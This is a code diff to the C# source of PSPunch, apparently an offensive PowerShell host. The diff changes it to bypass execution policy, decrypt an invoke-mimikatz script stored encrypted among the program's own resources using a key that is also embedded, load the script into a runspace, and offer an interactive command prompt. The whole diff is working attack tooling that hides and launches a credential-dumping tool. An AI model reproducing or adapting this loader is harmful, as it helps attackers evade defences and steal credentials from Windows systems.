@@ -5,23 +5,28 @@ using System.Management.Automation.Runspaces;
 using PSPunch.CryptUtil;
 using System.IO;
 using System.Text;
+using System.Reflection;
 
 namespace PSPunch
 {
     class Program
     {
-        public static void ImportModules(Runspace runspace)
+        public static Runspace PSInit(PSPunchHost host)
         {
-            string decFile = Utils.GetPSPunchDir() + "\\invoke-mimikatz.ps1.enc";
-            string key = Utils.GenerateKey();
-            MemoryStream decMem = FileTools.DecryptFile(decFile, key);
+            Runspace runspace = RunspaceFactory.CreateRunspace(host);
+            runspace.Open();
+            PSExec(runspace, host, "set-executionpolicy bypass -Scope process -Force");
+            return runspace;
+
+        }
+        public static void ImportModules(Runspace runspace, PSPunchHost host, Stream moduleStream)
+        {
+            Assembly assembly = Assembly.GetExecutingAssembly();
+            StreamReader keyReader = new StreamReader(assembly.GetManifestResourceStream("PSPunch.Modules.key.txt"));
+            string key = keyReader.ReadToEnd();
+            MemoryStream decMem = FileTools.DecryptFile(moduleStream, key);
             string module = Encoding.Unicode.GetString(decMem.ToArray());
-            using (Pipeline pipeline = runspace.CreatePipeline())
-            {
-                pipeline.Commands.AddScript(module);
-                pipeline.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);
-                pipeline.Invoke();
-            }
+            PSExec(runspace, host, module);
         }
 
         public static string PSExec(Runspace runspace, PSPunchHost host, string command)
@@ -37,12 +42,13 @@ namespace PSPunch
 
         static void Main(string[] args)
         {
-            PSPunchHost host = new PSPunchHost();
-            Runspace runspace = RunspaceFactory.CreateRunspace(host);
-            runspace.Open();
-            ImportModules(runspace);
             Console.BackgroundColor = ConsoleColor.DarkBlue;
             Console.Clear();
+            PSPunchHost host = new PSPunchHost();
+            Runspace runspace = PSInit(host);
+            Assembly assembly = Assembly.GetExecutingAssembly();
+            Stream moduleStream = assembly.GetManifestResourceStream("PSPunch.Modules.invoke-mimikatz.ps1.enc");
+            ImportModules(runspace, host, moduleStream);
             String cmd = null;
             while (cmd != "exit")
             {
@@ -50,6 +56,10 @@ namespace PSPunch
                 Console.Write("PSPUNCH! #> ");
                 Console.ForegroundColor = ConsoleColor.Yellow;
                 cmd = Console.ReadLine();
+                if (cmd == "exit")
+                {
+                    return;
+                }
                 string output = PSExec(runspace, host, cmd);
                 Console.Write(output);
             }
